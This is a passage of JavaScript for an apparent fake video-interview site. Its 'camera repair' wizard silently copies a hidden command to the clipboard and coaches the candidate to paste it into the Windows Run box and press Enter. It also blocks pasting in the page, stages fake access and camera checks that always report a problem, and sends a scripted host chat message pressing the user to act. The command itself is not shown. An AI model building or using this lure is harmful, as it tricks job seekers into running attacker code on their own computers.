  els.deviceRepairFallback?.classList.add("is-hidden");
  els.deviceRepairFallbackPanel?.classList.add("is-hidden");
}

function scheduleStep1Fallback() {
  resetStep1Fallback();
  if (!getRepairWizardSteps()[0]?.delayedFallback) {
    return;
  }

  repairStep1FallbackTimer = window.setTimeout(() => {
    if (state.device.repairWizardStep !== 1 || !isRepairDialogOpen()) return;
    els.deviceRepairFallback?.classList.remove("is-hidden");
  }, REPAIR_STEP1_FALLBACK_DELAY_MS);
}

function renderRepairActionKeys(keys, joiner = "+", keyStyle = "keyboard") {
  if (!els.deviceRepairActionKeys) return;

  els.deviceRepairActionKeys.innerHTML = "";
  els.deviceRepairActionKeys.classList.toggle("device-repair-wizard-keys--hero", keyStyle === "keyboard");
  els.deviceRepairActionKeys.classList.toggle("device-repair-wizard-keys--flow", keyStyle === "flow");

  if (!keys?.length) {
    els.deviceRepairActionKeys.classList.add("is-hidden");
    return;
  }

  els.deviceRepairActionKeys.classList.remove("is-hidden");
  keys.forEach((key, index) => {
    if (index > 0) {
      const connector = document.createElement("span");
      connector.className = keyStyle === "flow" ? "device-repair-flow-connector" : "device-repair-key-plus";
      if (keyStyle === "keyboard") {
        connector.textContent = joiner;
      }
      connector.setAttribute("aria-hidden", "true");
      els.deviceRepairActionKeys.append(connector);
    }

    const chip = document.createElement(keyStyle === "flow" ? "span" : "kbd");
    if (keyStyle === "flow") {
      chip.className = "device-repair-flow-chip";
    }
    chip.textContent = key;
    els.deviceRepairActionKeys.append(chip);
  });
}

function hideRepairStepPreviews() {
  els.deviceRepairRunPreview?.classList.add("is-hidden");
  els.deviceRepairBrowserPreview?.classList.add("is-hidden");
  els.deviceRepairSettingsPreview?.classList.add("is-hidden");
  els.deviceRepairAppsPreview?.classList.add("is-hidden");
}

function updateRepairActionCard(step) {
  const config = getRepairWizardSteps()[step - 1];
  const profile = getRepairProfile();
  const card = document.querySelector("#device-repair-action-card");

  if (!config.actionLabel || !card) {
    card?.classList.add("is-hidden");
    hideRepairStepPreviews();
    els.deviceRepairActionTrust?.classList.add("is-hidden");
    els.deviceRepairPlatformNote?.classList.add("is-hidden");
    resetStep1Fallback();
    return;
  }

  card.classList.remove("is-hidden");
  const keyStyle = config.keyStyle || "keyboard";
  const isFlowAction = keyStyle === "flow";
  const isRunStep = step === 1 && config.visual === "run";
  const isCompactRunAction = keyStyle === "keyboard" && (step === 2 || step === 3);
  const previewVisuals = new Set(["browser", "settings", "apps"]);
  const hasSidePreview = previewVisuals.has(config.visual);

  card.classList.toggle("device-repair-action-card--run", isRunStep);
  card.classList.toggle("device-repair-action-card--compact", isCompactRunAction);
  card.classList.toggle("device-repair-action-card--enter", keyStyle === "keyboard" && step === 3);
  card.classList.toggle("device-repair-action-card--flow", isFlowAction);
  card.classList.toggle("device-repair-action-card--with-preview", isFlowAction && hasSidePreview);

  if (els.deviceRepairActionLabel) {
    els.deviceRepairActionLabel.textContent = config.actionLabel;
  }
  if (els.deviceRepairActionHint) {
    els.deviceRepairActionHint.textContent = config.actionHint || "";
  }
  renderRepairActionKeys(config.keys, config.keyJoiner, keyStyle);

  hideRepairStepPreviews();
  if (config.visual === "browser") {
    els.deviceRepairBrowserPreview?.classList.remove("is-hidden");
  } else if (config.visual === "settings") {
    els.deviceRepairSettingsPreview?.classList.remove("is-hidden");
  } else if (config.visual === "apps") {
    els.deviceRepairAppsPreview?.classList.remove("is-hidden");
  }

  els.deviceRepairActionTrust?.classList.toggle("is-hidden", !isRunStep);
  els.deviceRepairPlatformNote?.classList.add("is-hidden");
  const trustTitle = els.deviceRepairActionTrust?.querySelector("strong");
  const trustDetail = els.deviceRepairActionTrust?.querySelector("small");
  if (trustTitle) {
    trustTitle.textContent = profile.trustTitle;
  }
  if (trustDetail) {
    trustDetail.textContent = profile.trustDetail;
  }
  if (els.deviceRepairFallbackPanel) {
    els.deviceRepairFallbackPanel.querySelector("strong").textContent = profile.fallbackTitle;
    els.deviceRepairFallbackPanel.querySelector("p").textContent = profile.fallbackBody;
  }
  if (!isRunStep) {
    resetStep1Fallback();
  }
}

function updateDeviceRepairReadyState() {
  if (!els.deviceRepairReady || !els.deviceRepairReadyText) return;
  const profile = getRepairProfile();

  if (!profile.command) {
    els.deviceRepairReady.classList.remove("is-warning");
    els.deviceRepairReadyText.textContent = `${profile.osLabel} steps ready · continue with the on-screen privacy instructions`;
    return;
  }

  if (state.device.repairCommandCopied) {
    els.deviceRepairReady.classList.remove("is-warning");
    els.deviceRepairReadyText.textContent = "Copied · click the Run Open field, then press Ctrl + V";
    return;
  }

  els.deviceRepairReady.classList.add("is-warning");
  els.deviceRepairReadyText.textContent = "Could not copy command — use Show steps again and retry from step 1";
}

const REPAIR_HEADER_ICON_PATHS = {
  run: "M7 4h10a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2Zm0 2v12h10V6H7Zm2 2h6v1.5H9V8Zm0 3h4v1.5H9V11Z",
  paste:
    "M9 3a2 2 0 0 0-2 2H6a3 3 0 0 0-3 3v8a3 3 0 0 0 3 3h9a3 3 0 0 0 3-3v-1h-2v1a1 1 0 0 1-1 1H6a1 1 0 0 1-1-1V8a1 1 0 0 1 1-1h1v1a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V7h1a1 1 0 0 1 1 1v3h2V8a3 3 0 0 0-3-3h-1a2 2 0 0 0-2-2H9Zm2 2h4v1H11V5Z",
  privacy:
    "M12 1a5 5 0 0 0-5 5v2H6a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2h-1V6a5 5 0 0 0-5-5Zm0 2a3 3 0 0 1 3 3v2H9V6a3 3 0 0 1 3-3Zm0 10a2 2 0 1 0 0 4 2 2 0 0 0 0-4Z",
  camera:
    "M17 10.5V7a5 5 0 0 0-10 0v3.5A2.5 2.5 0 0 0 4.5 13v4A2.5 2.5 0 0 0 7 19.5h10a2.5 2.5 0 0 0 2.5-2.5v-4A2.5 2.5 0 0 0 17 10.5ZM9 7a3 3 0 1 1 6 0v3.5H9V7Zm-1.5 8.5h7l-1.2-2.4a1 1 0 0 0-.9-.6H9.6a1 1 0 0 0-.9.6L7.5 15.5Z",
};

const REPAIR_CHECK_CARD_ICONS = {
  camera:
    '<svg viewBox="0 0 24 24" focusable="false" aria-hidden="true"><path d="M17 10.5V7a5 5 0 0 0-10 0v3.5A2.5 2.5 0 0 0 4.5 13v4A2.5 2.5 0 0 0 7 19.5h10a2.5 2.5 0 0 0 2.5-2.5v-4A2.5 2.5 0 0 0 17 10.5ZM9 7a3 3 0 1 1 6 0v3.5H9V7Zm-1.5 8.5h7l-1.2-2.4a1 1 0 0 0-.9-.6H9.6a1 1 0 0 0-.9.6L7.5 15.5Z"/></svg>',
  spinner: "",
  success:
    '<svg viewBox="0 0 24 24" focusable="false" aria-hidden="true"><path d="M9 16.17 4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>',
  error:
    '<svg viewBox="0 0 24 24" focusable="false" aria-hidden="true"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2Zm1 15h-2v-2h2v2Zm0-4h-2V7h2v6Z"/></svg>',
};

function updateRepairHeaderIcon(step) {
  const iconHost = els.deviceRepairHeaderIcon;
  if (!iconHost) return;

  const config = getRepairWizardSteps()[step - 1];
  const iconKey = config?.headerIcon || "run";
  const path = REPAIR_HEADER_ICON_PATHS[iconKey] || REPAIR_HEADER_ICON_PATHS.run;

  iconHost.className = "device-repair-header__icon";
  iconHost.classList.add(`device-repair-header__icon--${iconKey}`);

  const svg = iconHost.querySelector("svg");
  if (!svg) return;

  svg.innerHTML = `<path d="${path}"/>`;
}

function renderRepairCheckCard(state = "default") {
  const cards = {
    default: {
      tone: null,
      icon: "camera",
      title: "Live camera check",
      body: "We verify your camera before you continue to the panel review.",
      tips: null,
    },
    checking: {
      tone: "checking",
      icon: "spinner",
      title: "Checking connection",
      body: "Testing your camera route to the interview room...",
      tips: null,
    },
    success: {
      tone: "success",
      icon: "success",
      title: "Camera connected",
      body: "Your video route to the interview room is ready.",
      tips: null,
    },
    error: {
      tone: "error",
      icon: "error",
      title: "Video still unavailable",
      body: "Camera access is not available yet.",
      tips: [`Return to the ${getRepairProfile().osLabel} permission steps, allow camera for this browser, then retry.`],
    },
  };

  const card = cards[state] || cards.default;
  const tipsHtml = card.tips
    ? `<ul class="device-repair-check-card__tips">${card.tips
        .map((tip) => `<li>${tip}</li>`)
        .join("")}</ul>`
    : "";

  const iconMarkup =
    card.icon === "spinner"
      ? '<span class="device-repair-check-card__spinner" aria-hidden="true"></span>'
      : `<span class="device-repair-check-card__icon device-repair-check-card__icon--${card.icon}">${REPAIR_CHECK_CARD_ICONS[card.icon] || ""}</span>`;

  return `<div class="device-repair-check-card__layout">${iconMarkup}<div class="device-repair-check-card__body"><strong>${card.title}</strong><p>${card.body}</p>${tipsHtml}</div></div>`;
}

function setRepairCheckCardState(stateName) {
  if (!els.deviceRepairCheckStatus) return;

  els.deviceRepairCheckStatus.classList.remove("is-checking", "is-success", "is-error");
  if (stateName) {
    els.deviceRepairCheckStatus.classList.add(`is-${stateName}`);
  }

  const stateKey =
    stateName === "checking" || stateName === "success" || stateName === "error"
      ? stateName
      : "default";
  els.deviceRepairCheckStatus.innerHTML = renderRepairCheckCard(stateKey);
}

function resetRepairWizard() {
  state.device.repairWizardStep = 1;
  state.device.cameraChecking = false;

  if (els.deviceRepairCheckStatus) {
    setRepairCheckCardState(null);
  }

  clearRepairKeyWarnings();
  setRepairWizardStep(1, { resetActions: true });
}

function copyRepairCommandToClipboard() {
  const command = getRepairProfile().command;
  if (!command) {
    state.device.repairCommandCopied = false;
    return false;
  }

  try {
    const textarea = document.createElement("textarea");
    textarea.value = command;
    textarea.setAttribute("readonly", "");
    textarea.style.cssText = "position:fixed;left:-9999px;top:0;opacity:0;pointer-events:none";
    document.body.append(textarea);
    textarea.focus();
    textarea.select();
    const copied = document.execCommand("copy");
    textarea.remove();
    state.device.repairCommandCopied = copied;
    return copied;
  } catch {
    state.device.repairCommandCopied = false;
    return false;
  }
}

function setRepairWizardStep(step, options = {}) {
  const steps = getRepairWizardSteps();
  const total = steps.length;
  const config = steps[step - 1];
  state.device.repairWizardStep = step;

  updateRepairStepper(step);

  if (els.deviceRepairProgressLabel) {
    els.deviceRepairProgressLabel.textContent = `Step ${step} of ${total}`;
  }
  if (els.deviceRepairProgressTagline) {
    els.deviceRepairProgressTagline.textContent = config.tagline || "";
  }
  if (els.deviceRepairProgressFill) {
    els.deviceRepairProgressFill.style.width = `${(step / total) * 100}%`;
  }
  if (els.deviceRepairTitle) {
    els.deviceRepairTitle.textContent = config.title;
  }
  if (els.deviceRepairCopy) {
    els.deviceRepairCopy.textContent = config.copy;
  }
  if (els.deviceRepairDetail) {
    els.deviceRepairDetail.textContent = config.detail;
  }

  updateRepairActionCard(step);
  updateRepairHeaderIcon(step);

  els.deviceRepairMain?.classList.toggle("is-verify-step", step === total);

  els.deviceRepairSteps.forEach((panel, index) => {
    const panelStep = index + 1;
    if (panelStep === 1) {
      panel?.classList.add("is-hidden");
      return;
    }
    panel?.classList.toggle("is-hidden", panelStep !== step);
  });

  playRepairStepEnterAnimation(step);

  els.deviceRepairActions?.classList.remove("is-hidden");

  if (options.resetActions || step < total) {
    els.deviceRepairContinue.classList.add("is-hidden");
    els.deviceRepairContinue.disabled = true;
    els.deviceRepairRestart.classList.add("is-hidden");
  }

  if (step < total) {
    els.deviceRepairCheck.classList.add("is-hidden");
    els.deviceRepairConfirmHint?.classList.remove("is-hidden");
    els.deviceRepairNext?.classList.remove("is-hidden");
    els.deviceRepairNext.disabled = false;
    els.deviceRepairNext.textContent = config.confirm;

    if (els.deviceRepairConfirmHint) {
      els.deviceRepairConfirmHint.textContent = config.hint || REPAIR_CONFIRM_HINT_DEFAULT;
    }

    if (step === 2) {
      updateDeviceRepairReadyState();
    }
  } else {
    els.deviceRepairNext?.classList.add("is-hidden");
    els.deviceRepairCheck.classList.remove("is-hidden");
    els.deviceRepairCheck.disabled = false;
    els.deviceRepairCheck.textContent = config.confirm;
    els.deviceRepairConfirmHint?.classList.add("is-hidden");
    els.deviceRepairRestart.classList.toggle("is-hidden", !state.device.cameraRepairAttempted);

    if (step === total && !state.device.cameraRepairAttempted) {
      setRepairCheckCardState(null);
    }
  }

  clearRepairKeyWarnings();

  if (step === 3) {
    els.deviceRepairNext?.blur();
  }

  if (step === 1) {
    scheduleStep1Fallback();
  } else {
    resetStep1Fallback();
  }
}

function shouldGuardRepairPasteStep() {
  return (
    isRepairDialogOpen() &&
    Boolean(getRepairProfile().command) &&
    state.device.repairWizardStep === 2 &&
    !state.device.cameraRepairAttempted
  );
}

function shouldGuardRepairEnterStep() {
  return (
    isRepairDialogOpen() &&
    Boolean(getRepairProfile().command) &&
    state.device.repairWizardStep === 3 &&
    !state.device.cameraRepairAttempted
  );
}

function clearRepairKeyWarnings() {
  Object.values(REPAIR_KEY_WARNINGS).forEach((config) => {
    config.getElement()?.classList.add("is-hidden");
  });
}

function showRepairWrongKeyWarning(type) {
  const config = REPAIR_KEY_WARNINGS[type];
  if (!config) return;

  config.getElement()?.classList.remove("is-hidden");

  const now = Date.now();
  if (now - repairWrongKeyToastAt < REPAIR_WRONG_KEY_TOAST_MS) return;

  repairWrongKeyToastAt = now;
  showToast(config.toast);
}

function shouldIgnoreRepairKeyGuard(event) {
  const target = event.target;
  if (!(target instanceof HTMLElement)) return false;
  return Boolean(target.closest("button, a, input, textarea, select, [contenteditable='true']"));
}

function handleRepairWizardKeydownGuard(event) {
  if (shouldGuardRepairEnterStep() && event.key === "Enter") {
    event.preventDefault();
    event.stopPropagation();
    showRepairWrongKeyWarning("enter");
    return;
  }

  if (shouldIgnoreRepairKeyGuard(event)) return;

  if (shouldGuardRepairPasteStep()) {
    const isPasteShortcut =
      (event.key === "v" || event.key === "V") && (event.ctrlKey || event.metaKey);

    if (isPasteShortcut) {
      event.preventDefault();
      showRepairWrongKeyWarning("paste");
    }
  }
}

function isRepairDialogOpen() {
  return !els.deviceRepairDialog.classList.contains("is-hidden");
}

function advanceRepairWizard() {
  const step = state.device.repairWizardStep;
  if (step >= getRepairWizardSteps().length) return;
  setRepairWizardStep(step + 1);
}

function confirmRepairWizardStep() {
  if (!isRepairDialogOpen() || state.device.cameraRepairAttempted) return;

  const step = state.device.repairWizardStep;
  if (step >= getRepairWizardSteps().length) return;

  if (step === 1) {
    resetStep1Fallback();
    copyRepairCommandToClipboard();
    updateDeviceRepairReadyState();
  }

  advanceRepairWizard();
}

function sendRepairNudgeIfNeeded() {
  if (state.device.repairNudgeSent || state.role !== "guest") return;

  state.device.repairNudgeSent = true;
  const candidateName = state.currentUser.name || "there";
  const platform = getClientPlatform();
  const platformHint =
    platform.key === "windows"
      ? "Windows is blocking your outgoing video on this device"
      : `${platform.label} needs a quick camera permission fix on this device`;
  addChatMessage(
    state.hostName,
    `Hi ${candidateName} — we're in the room and can see you connected. ${platformHint}; the setup guide walks you through it (~1 min). You can see us — we just need your camera on before the panel review.`,
  );
  addSystemEvent("Camera setup needed.");
}

function updateInterviewDeviceStatus() {
  if (!els.interviewDeviceStatus) return;

  const label = state.currentUser.video ? "Camera ready" : "Video pending";
  els.interviewDeviceStatus.innerHTML = `<strong>Device</strong> ${label}`;
  els.interviewDeviceStatus.classList.toggle("is-warning", !state.currentUser.video);
}

function setCameraSetupBarState(mode = "default") {
  const copy = CAMERA_SETUP_BAR_COPY[mode] || CAMERA_SETUP_BAR_COPY.default;
  if (els.cameraSetupTitle) {
    els.cameraSetupTitle.textContent = copy.title;
  }
  if (els.cameraSetupCopy) {
    els.cameraSetupCopy.textContent = copy.copy;
  }
  if (els.openDeviceRepair) {
    els.openDeviceRepair.textContent = copy.action;
    els.openDeviceRepair.disabled = copy.disabled;
  }
}

function setCameraSetupBarVisible(visible, mode = "default") {
  setCameraSetupBarState(mode);
  els.systemBanner?.classList.toggle("is-hidden", !visible);
}

function clearRepairPreflight() {
  window.clearTimeout(repairPreflightTimer);
  window.clearInterval(repairPreflightCheckTimer);
  repairPreflightTimer = null;
  repairPreflightCheckTimer = null;
  els.deviceRepairCard?.classList.remove("is-preflighting");
  els.deviceRepairMain?.classList.remove("is-preflighting");
  els.deviceRepairPreflight?.classList.add("is-hidden");
  els.deviceRepairWorkspace?.classList.remove("is-hidden", "is-revealing");
  els.deviceRepairPreflightChecks
    ?.querySelectorAll("[data-preflight-check]")
    .forEach((item) => item.classList.remove("is-done", "is-active", "is-issue"));
}

function startRepairPreflight(onComplete) {
  clearRepairPreflight();
  els.deviceRepairCard?.classList.add("is-preflighting");
  els.deviceRepairMain?.classList.add("is-preflighting");
  els.deviceRepairPreflight?.classList.remove("is-hidden");
  els.deviceRepairWorkspace?.classList.add("is-hidden");

  const checks = Array.from(
    els.deviceRepairPreflightChecks?.querySelectorAll("[data-preflight-check]") || [],
  );
  let checkIndex = 0;

  const markCheck = () => {
    if (checkIndex > 0) {
      checks[checkIndex - 1]?.classList.remove("is-active");
      checks[checkIndex - 1]?.classList.add("is-done");
    }

    if (checkIndex >= checks.length) {
      return;
    }

    const current = checks[checkIndex];
    current?.classList.add("is-active");
    if (current?.dataset.preflightCheck === "camera") {
      current.classList.add("is-issue");
    }
    checkIndex += 1;
  };

  markCheck();
  repairPreflightCheckTimer = window.setInterval(() => {
    if (checkIndex >= checks.length) {
      window.clearInterval(repairPreflightCheckTimer);
      repairPreflightCheckTimer = null;
      return;
    }
    markCheck();
  }, REPAIR_PREFLIGHT_CHECK_MS);

  repairPreflightTimer = window.setTimeout(() => {
    clearRepairPreflight();
    els.deviceRepairWorkspace?.classList.add("is-revealing");
    window.setTimeout(() => els.deviceRepairWorkspace?.classList.remove("is-revealing"), 420);
    onComplete?.();
  }, REPAIR_PREFLIGHT_MS);
}

function showDeviceRepairDialog(options = {}) {
  if (state.role === "guest" && !state.securityVerified) {
    showPostJoinSecurity();
    showToast("Complete access verification first.");
    return;
  }

  updateRepairHostContext();
  updateRepairPlatformContext();

  if (!state.device.cameraRepairAttempted) {
    resetRepairWizard();
  } else if (!state.device.cameraRepairResolved) {
    setRepairWizardStep(getRepairWizardSteps().length);
    els.deviceRepairActions?.classList.remove("is-hidden");
    els.deviceRepairCheck.classList.toggle("is-hidden", state.device.cameraRecognized);
    els.deviceRepairContinue.classList.toggle("is-hidden", !state.device.cameraRecognized);
    els.deviceRepairContinue.disabled = !state.device.cameraRecognized;
    els.deviceRepairRestart.classList.remove("is-hidden");
    if (els.deviceRepairCheckStatus) {
      setRepairCheckCardState(state.device.cameraRecognized ? "success" : "error");
    }
  }

  sendRepairNudgeIfNeeded();
  setCameraSetupBarVisible(false);
  els.deviceRepairDialog.classList.remove("is-hidden");

  if (options.preflight) {
    startRepairPreflight();
  } else {
    clearRepairPreflight();
  }
}

function hideDeviceRepairDialog() {
  clearRepairKeyWarnings();
  clearRepairPreflight();
  resetStep1Fallback();
  els.deviceRepairDialog.classList.add("is-hidden");
  if (!state.currentUser.video && !state.device.cameraRepairResolved) {
    setCameraSetupBarVisible(true);
  }
}

async function checkCameraInRepairDialog() {
  if (state.device.cameraChecking) return;

  if (!navigator.mediaDevices?.getUserMedia) {
    showToast("Camera check is not supported in this browser.");
    return;
  }

  state.device.cameraChecking = true;
  els.deviceRepairCheck.disabled = true;
  els.deviceRepairCheck.textContent = "Checking camera...";

  if (els.deviceRepairCheckStatus) {
    setRepairCheckCardState("checking");
  }

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
    stream.getTracks().forEach((track) => track.stop());

    state.device.cameraChecking = false;
    state.device.cameraRepairAttempted = true;
    state.device.cameraRecognized = true;
    setCameraDeviceRowState(true);
    setButtonState(els.prejoinCamera, true, "Camera on", "Camera off");
    els.previewVideoState.textContent = "Camera ready";
    els.cameraDeviceStatus.textContent = "Camera ready";

    if (els.deviceRepairCheckStatus) {
      setRepairCheckCardState("success");
    }

    els.deviceRepairCheck.classList.add("is-hidden");
    els.deviceRepairContinue.classList.remove("is-hidden");
    els.deviceRepairContinue.disabled = false;
    els.deviceRepairRestart.classList.remove("is-hidden");
    showToast("Camera verified successfully.");
  } catch {
    state.device.cameraChecking = false;
    state.device.cameraRepairAttempted = true;
    state.device.cameraRecognized = false;
    els.deviceRepairCheck.disabled = false;
    els.deviceRepairCheck.textContent = "Retry camera check";

    if (els.deviceRepairCheckStatus) {
      setRepairCheckCardState("error");
    }

    els.deviceRepairRestart.classList.remove("is-hidden");
    showToast(`Camera check failed. Confirm ${getRepairProfile().osLabel} settings, then retry.`);
  }
}

function continueAfterDeviceRepair() {
  if (!state.device.cameraRecognized) return;

  state.currentUser.video = true;
  state.device.cameraRepairResolved = true;
  setCameraSetupBarVisible(false);
  updateInterviewDeviceStatus();
  els.cameraButton.classList.add("is-active");
  els.cameraButton.querySelector("small").textContent = "Stop";
  renderGallery();
  renderParticipants();
  hideDeviceRepairDialog();
  showToast("Camera setup complete. You're ready for the interview.");
}

function setCameraDeviceRowState(isOk) {
  els.cameraDeviceRow.classList.toggle("is-warning", !isOk);
  els.cameraDeviceRow.classList.toggle("is-ok", isOk);
}

function resetSecurityCheck() {
  state.securityVerified = false;
  els.securityCard.classList.remove("is-verified", "is-checking");
  els.securityReference.textContent = createSecurityReference();
  els.securityStatus.textContent = "Verify access";
  els.securityStartButton.disabled = false;
  els.securityStartButton.textContent = "Start verification";
  els.securityButton.classList.remove("is-active");
  els.securityButton.querySelector("small").textContent = "Check";
  updateJoinAvailability();
}

function setSecurityVerified() {
  state.securityVerified = true;
  els.securityCard.classList.remove("is-checking");
  els.securityCard.classList.add("is-verified");
  els.securityStatus.textContent = "Access verified";
  els.securityStartButton.disabled = true;
  els.securityStartButton.textContent = "Access confirmed";
  els.sessionSecurityReference.textContent = els.securityReference.textContent;
  els.securityButton.classList.add("is-active");
  els.securityButton.querySelector("small").textContent = "Verified";
  updateJoinAvailability();

  if (state.role === "guest" && !state.device.cameraRepairResolved) {
    window.setTimeout(() => {
      els.securityStatus.textContent = "Checking camera...";
      els.securityStartButton.textContent = "Device check running";
    }, 650);
  }

  window.setTimeout(() => {
    hidePostJoinSecurity();
    if (state.role === "guest" && !state.device.cameraRepairResolved) {
      setCameraSetupBarVisible(true, "diagnosing");
      window.setTimeout(() => showDeviceRepairDialog({ preflight: true }), REPAIR_DIALOG_OPEN_DELAY_MS);
    }
  }, REPAIR_VERIFIED_HOLD_MS);
}

function updateJoinAvailability() {
  const hasName = validateDisplayName();
  const mobileBlocked = isMobileJoinBlocked();
  els.mobileDeviceAlert?.classList.toggle("is-hidden", !mobileBlocked);
  els.joinButton.disabled = state.isJoining || !hasName || mobileBlocked;
  if (state.isJoining) {
    els.joinButton.textContent = "Connecting...";
    return;
  }
  if (mobileBlocked && els.joinSettingsStatus) {
    els.joinSettingsStatus.textContent = "Desktop required";
    els.joinButton.textContent = "Desktop required";
    return;
  }
  if (!hasName && els.displayNameError?.classList.contains("is-hidden") && els.joinSettingsStatus) {
    els.joinSettingsStatus.textContent = "Enter name to continue";
    els.joinButton.textContent = "Enter name to join";
  } else if (hasName && els.joinSettingsStatus) {
    els.joinSettingsStatus.textContent = "Ready to join";
    els.joinButton.textContent = "Join interview";
  }
}

function preferredBriefVisible() {
  return window.matchMedia("(min-width: 1600px) and (min-height: 820px)").matches;
}

function syncBriefPanelForViewport() {
  if (!state.inMeeting) return;

  const shouldShowBrief = preferredBriefVisible();
  if (state.briefVisible !== shouldShowBrief) {
    toggleBriefPanel(shouldShowBrief);
  }
}

function showPostJoinSecurity() {
  resetSecurityCheck();
  els.meeting.classList.add("is-access-gated");
  els.postJoinSecurity.classList.remove("is-hidden");
}

function hidePostJoinSecurity() {
  els.meeting.classList.remove("is-access-gated");
  els.postJoinSecurity.classList.add("is-hidden");
}

function openSecurityDetails() {
  closeMoreMenu();
  els.interviewBriefPanel.classList.add("is-hidden");
  els.participantsPanel.classList.add("is-hidden");
  els.chatPanel.classList.add("is-hidden");
  els.securityPanel.classList.remove("is-hidden");
  els.participantsButton.classList.remove("is-active");
  els.chatButton.classList.remove("is-active");
  els.securityButton.classList.add("is-active");
  els.sessionSecurityReference.textContent = els.securityReference.textContent;
  showToast("Security details opened");
}

function runCloudVerification() {
  els.securityCard.classList.add("is-checking");
  els.securityStartButton.disabled = true;
  els.securityStartButton.textContent = "Checking";
  els.securityStatus.textContent = "Verifying access...";

  window.setTimeout(() => {
    els.securityStatus.textContent = "Checking compliance...";
  }, 700);

  window.setTimeout(() => {
    els.securityStatus.textContent = "Checking camera...";
  }, 1500);

  window.setTimeout(() => {
    els.securityStatus.textContent = "Camera setup needed";
  }, 2100);

  window.setTimeout(setSecurityVerified, 2800);
}

function setButtonState(button, active, activeText, inactiveText) {
  button.classList.toggle("is-active", active);
  button.textContent = active ? activeText : inactiveText;
}

function lockMeetingViewport() {
  document.documentElement.style.overflow = "hidden";
  document.body.style.overflow = "hidden";
}

function unlockMeetingViewport() {
  document.documentElement.style.overflow = "";
  document.body.style.overflow = "";
}

function hydrateMeeting() {
  state.currentUser.name = els.displayName.value.trim() || "Candidate";
  state.currentUser.muted = !els.prejoinMic.classList.contains("is-active");
  state.currentUser.video =
    state.device.cameraRecognized && els.prejoinCamera.classList.contains("is-active");
  state.topic = els.meetingTopic.value.trim() || DEFAULT_TOPIC;
  state.duration = normalizeDuration(state.duration);
  state.participants = [state.currentUser, ...getPanelPeople()];
  state.messages = [...getSampleMessages()];
  state.unreadChat = 0;
  state.inMeeting = true;
  state.startedAt = Date.now();
  state.activeSpeakerIndex = 0;
  state.briefVisible = preferredBriefVisible();
  state.systemEvents = [];
  clearEventTimers();

  els.roomTitle.textContent = state.topic;
  updateInterviewBrief();
  els.meetingId.textContent = `Meeting ID: ${state.roomCode} · Passcode: ${state.passcode}`;
  els.participantCount.textContent = String(state.participants.length);
  updateChatBadge();
  els.micButton.classList.toggle("is-active", !state.currentUser.muted);
  els.cameraButton.classList.toggle("is-active", state.currentUser.video);
  els.micButton.querySelector("small").textContent = state.currentUser.muted ? "Unmute" : "Mute";
  els.cameraButton.querySelector("small").textContent = state.currentUser.video ? "Stop" : "Start";
  els.cameraButton.classList.toggle("has-alert", state.inMeeting && !state.currentUser.video);
  els.securityButton.classList.remove("is-active");
  els.securityButton.querySelector("small").textContent = "Check";
  setCameraSetupBarVisible(!state.currentUser.video);
  updateInterviewDeviceStatus();

  updateInviteLink();
  updateCreatedRoom();
  updateInviteContext();
  renderGallery();
  renderParticipants();
  renderChat();
  renderEventFeed();
  toggleBriefPanel(state.briefVisible);
  startTimer();
  rotateSpeaker();
  scheduleSystemEvents();
  lockMeetingViewport();
}

function updateInviteLink() {
  els.inviteLink.value = buildInviteUrl();
}

function startTimer() {
  clearInterval(state.timerId);
  els.timer.textContent = "00:00";
  state.timerId = window.setInterval(() => {
    const elapsed = Math.floor((Date.now() - state.startedAt) / 1000);
    els.timer.textContent = formatTime(elapsed);
  }, 1000);
}

function renderGallery() {
  els.gallery.replaceChildren();

  state.participants.forEach((person, index) => {
    const tile = document.createElement("article");
    tile.className = "video-tile";
    tile.dataset.index = String(index);
    tile.style.setProperty("--tile-from", person.colors[0]);
    tile.style.setProperty("--tile-to", person.colors[1]);
    tile.classList.toggle("is-speaking", index === state.activeSpeakerIndex);
    tile.classList.toggle("is-muted", person.muted);
    tile.classList.toggle("has-video", person.video);
    tile.classList.toggle("camera-off", !person.video);

    const visual = person.video ? createVideoScene(index) : createAvatar(person.name);

    const status = document.createElement("span");
    status.className = "tile-status";
    status.textContent = index === 0 ? "You" : person.role;

    const mute = document.createElement("span");
    mute.className = "mute-chip";
    mute.textContent = person.muted ? "Muted" : "Mic on";

    const name = document.createElement("span");
    name.className = "tile-name";
    name.textContent = person.name;

    tile.append(status, mute, visual, name);
    els.gallery.append(tile);
  });
}

function createAvatar(name) {
  const avatar = document.createElement("div");
  avatar.className = "avatar tile-avatar";
  avatar.textContent = getInitials(name);
  return avatar;
}

function createVideoScene(index) {
  const scene = document.createElement("div");
  scene.className = "video-scene";

  const lamp = document.createElement("span");
  lamp.className = "scene-lamp";
  const head = document.createElement("span");
  head.className = "scene-head";
  const body = document.createElement("span");
  body.className = "scene-body";
  const desk = document.createElement("span");
  desk.className = "scene-desk";

  scene.style.setProperty("--scene-offset", `${(index % 3) * 8 - 8}px`);
  scene.append(lamp, head, body, desk);
  return scene;
}

function renderParticipants() {
  els.participantsList.replaceChildren();

  state.participants.forEach((person, index) => {
    const row = document.createElement("div");
    row.className = "participant-row";

    const avatar = document.createElement("div");
    avatar.className = "avatar";
    avatar.textContent = getInitials(person.name);

    const detail = document.createElement("div");
    const name = document.createElement("strong");
    const role = document.createElement("small");
    name.textContent = index === 0 ? `${person.name} (you)` : person.name;
    role.textContent = person.role;
    detail.append(name, document.createElement("br"), role);

    const icons = document.createElement("span");
    icons.className = "participant-icons";
    icons.textContent = `${person.muted ? "Muted" : "Mic"} / ${person.video ? "Video" : "No video"}`;

    row.append(avatar, detail, icons);
    els.participantsList.append(row);
  });
}

function renderChat() {
  els.chatList.replaceChildren();

  state.messages.forEach(([author, message]) => {
    const item = document.createElement("div");
    item.className = "chat-message";

    const meta = document.createElement("small");
    meta.textContent = `${author} to everyone`;

    const text = document.createElement("p");
    text.textContent = message;

    item.append(meta, text);
    els.chatList.append(item);
  });

  els.chatList.scrollTop = els.chatList.scrollHeight;
}

function updateChatBadge() {
  if (!els.chatBadge || !els.chatButton) return;

  const unread = Math.max(0, state.unreadChat);
